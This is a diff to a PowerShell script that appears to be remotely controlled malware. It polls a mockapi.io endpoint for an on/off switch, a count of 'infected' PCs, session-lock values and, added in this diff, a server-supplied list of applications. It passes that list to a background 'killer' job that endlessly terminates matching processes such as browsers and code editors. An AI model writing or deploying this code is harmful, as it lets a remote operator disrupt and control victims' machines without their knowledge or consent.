@@ -62,12 +62,13 @@ $global:nbPcInfectIncr = $null
 $global:lastMessageIncr = ""
 $global:lastNbPcInfectIncr = ""
 $global:nbLockSession = $null
+$global:blacklist = @()
 $global:lastNbLockSession = ""
 
 function checkDataBase {
     try {
         $response = Invoke-RestMethod -Uri "https://68138d49129f6313e211a66e.mockapi.io/management" -Method Get -TimeoutSec 10
-        
+        Write-Host $response
         if ($response -ne $null) {
             $global:isActive = $response.isActive
             $global:nbPcInfect = $response.nbPcInfect.nbPcInfect
@@ -81,6 +82,13 @@ function checkDataBase {
                 $global:message = $null
                 $global:messageIncr = $null
             }
+
+            if ($response.appsToBlocked.Count -gt 0) {
+                $global:blacklist = @($response.appsToBlocked)
+            } else {
+                $global:blacklist = @()
+            }
+
         } else {
             Write-Warning "API response was null."
             $global:isActive = $null
@@ -89,6 +97,7 @@ function checkDataBase {
             $global:nbPcInfectIncr = $null
             $global:nbPcInfect = 0
             $global:nbLockSession = $null
+            $global:blacklist = @()
         }
     } catch {
         Write-Error "Error checking database: $($_.Exception.Message)"
@@ -98,13 +107,14 @@ function checkDataBase {
         $global:nbPcInfect = 0
         $global:nbPcInfectIncr = $null
         $global:nbLockSession = $null
+        $global:blacklist = @()
     }
 }
 
 function closeApp {
-    $blacklist = @('chrome', 'msedge', 'code')
-
-    Write-Host "Starting application killer..." -ForegroundColor Magenta
+    param (
+        [string[]]$blacklist
+    )
     while ($true) {
         Get-Process | Where-Object { $blacklist -contains $_.ProcessName } | ForEach-Object {
             try {
@@ -200,9 +210,9 @@ function main {
 
             if ($global:isActive -and -not $isRunning) {
                 Write-Host "isActive is true. Starting killer job..." -ForegroundColor Green
+                Write-Host "Blacklist avant Start-Job : $($global:blacklist -join ', ')"  # AJOUTEZ CETTE LIGNE
                 try {
-                    $jobCloseApp = Start-Job -ScriptBlock ${function:closeApp}
-
+                    $jobCloseApp = Start-Job -ScriptBlock ${function:closeApp} -ArgumentList $global:blacklist
                     if ($jobCloseApp) {
                         $isRunning = $true
                         Write-Host "Killer job started successfully (State: $($jobCloseApp.State))." -ForegroundColor Green
